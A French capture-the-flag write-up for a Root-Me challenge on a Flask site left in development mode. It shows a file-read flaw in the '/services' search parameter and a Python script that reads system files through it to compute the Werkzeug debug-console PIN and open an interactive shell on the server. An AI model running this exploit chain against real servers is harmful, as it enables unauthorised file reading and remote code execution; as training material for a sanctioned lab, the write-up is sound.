---
title: Web-Serveur - Flask - Development server
meta_title: ""
description: Web-Serveur - Flask - Development server
date: 2024-07-16T19:00:00Z
image: /images/rootme_logo.png
categories:
  - Rootme
  - Web-Serveur
  - Moyen
author: Demat
tags:
  - web-server
  - flask
  - development-server
  - lfi
draft: false
isSecret: true
---

## Description

### Énoncé

**Lien du challenge : [Web-Serveur - Flask - Development server](https://www.root-me.org/fr/Challenges/Web-Serveur/Flask-Development-server)**

> #### You need to debug this !
>
> Le développeur web de la société Flask-me vous indique que le site web est prêt à être déployé.
>
> Vérifier que le site est sécurisé avant la mise en production.
>
> Le flag se situe dans le répertoire web de l’application.
>
> #### Accès au challenge
>
> - [Flask-me](http://challenge01.root-me.org/web-serveur/ch85/)

## Exploitation

### Analyse du site web

Il s'agit d'un site web minimaliste avec une [landing page](http://challenge01.root-me.org:59085/) et, seule page fonctionnelle, une page décrivant différents [services](http://challenge01.root-me.org:59085/services) qui ne sont pas encore implémentés.

L'énoncé nous indique que le serveur utilise Flask, un framework web en Python. Ceci est confirmé par l'en-tête `Server: Werkzeug/3.0.0 Python/3.11.9` de la réponse HTTP : *Werkzeug* est la bibliothèque WSGI sous-jacente de Flask.

### Recherche de failles

#### Console de debug

Le nom du challenge, *Development server*, nous indique que le serveur est en mode développement. Pour Flask, cela signifie qu'il existe un endpoint de debug à l'adresse [/console](http://challenge01.root-me.org:59085/console).

En visitant cette page, on peut confirmer que la console de debug est activée, mais elle est protégée par un code PIN.

![Console de debug protégée par un code PIN](/images/flask-dev-server/console-locked-pin.png)

#### Code PIN

Après quelques recherches, on tombe sur ce lien expliquant le fonctionnement du PIN : https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug#pin-protected-path-traversal.

Ce code est généré par le serveur en fonction d'informations propres à la machine et à l'environnement d'exécution. Il est donc unique pour chaque instance de serveur.

Il utilise les informations suivantes :

- `username` : nom de l'utilisateur qui a lancé le serveur
- `modname` : nom du module Python qui a lancé le serveur, typiquement `flask.app`
- Nom de la classe de l'instance d'application Flask : généralement `Flask`
- Chemin absolu du script principal de l'application Flask (`app.py`)
- Adresse MAC du serveur, obtenue avec `uuid.getnode()`
- `get_machine_id()` : génère un identifiant unique pour la machine à partir de fichiers système

Pour obtenir le code PIN, il nous faut donc un accès au contenu des fichiers système de la machine, c'est-à-dire une LFI (Local File Inclusion).

#### Faille LFI

Sur la page [/services](http://challenge01.root-me.org:59085/services), on remarque une fonction de recherche, avec la précision qu'elle n'est pas encore totalement fonctionnelle.

Avec une première [recherche de test](http://challenge01.root-me.org:59085/services?search=test), on constate que le serveur renvoie le message `[Errno 2] No such file or directory: 'test'` : le serveur tente a priori d'accéder au fichier dont le nom est la chaîne de recherche.

Testons avec le chemin absolu [/etc/hosts](http://challenge01.root-me.org:59085/services?search=%2Fetc%2Fhosts) :

![Contenu du fichier /etc/hosts](/images/flask-dev-server/etc-hosts.png)

Bingo !

### Exploitation des failles

Suite à quelques recherches, je suis tombé sur une bibliothèque Python nommée [WConsole Extractor](https://github.com/Ruulian/wconsole_extractor) qui effectue une exploitation automatisée de la faille de la console de debug de Flask, si on lui fournit une fonction pour lire un fichier arbitraire sur le serveur.

Il nous reste donc juste à implémenter cette fonction et à la passer au constructeur `WConsoleExtractor`, comme indiqué sur le README du projet.

Pour cela, nous allons utiliser les bibliothèques `requests` et `BeautifulSoup` pour effectuer les requêtes HTTP et parser le contenu HTML de la page.

```python
#!/usr/bin/env python3

from urllib.parse import urljoin

import requests
from bs4 import BeautifulSoup
from wconsole_extractor import WConsoleExtractor, info

URL = "http://challenge01.root-me.org:59085/"


def leak_function(filename: str) -> str:
    url = urljoin(URL, "/services")
    r = requests.get(url, params={"search": filename})
    if r.status_code == 200:
        if "Errno" in r.text:
            return ""
        soup = BeautifulSoup(r.text, "html.parser")
        center = soup.select_one("div.service_container > div.container > center")
        if center is None:
            return ""
        return center.text.removeprefix("\n          ").removesuffix("\n        ")
    else:
        return ""


def main() -> None:
    extractor = WConsoleExtractor(target=URL, leak_function=leak_function)

    info(f"PIN CODE: {extractor.pin_code}")
    extractor.shell()


if __name__ == "__main__":
    main()
```

Grâce à ce script, on obtient non seulement le code PIN, mais également un shell interactif sur le serveur :

![Shell interactif avec WConsole Extractor](/images/flask-dev-server/wconsole-shell.png)
